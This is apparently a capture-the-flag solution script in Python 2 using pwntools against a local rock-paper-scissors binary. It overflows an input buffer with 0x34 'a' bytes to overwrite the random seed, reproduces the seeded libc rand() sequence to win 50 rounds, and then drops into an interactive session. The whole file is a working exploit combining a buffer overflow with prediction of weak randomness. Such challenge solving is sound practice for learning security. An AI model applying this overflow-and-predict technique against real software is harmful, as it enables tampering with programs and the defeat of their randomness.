from pwn import *
from ctypes import *

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(u32("aaaa"))

p = process("./rps")
print p.recv()
p.sendline("a"*(0x30+4))
print p.recv()

rps = 'RPS'

for i in range(50):
	p.sendline(rps[(libc.rand()%3+1)%3])
	print p.recv()

p.interactive()
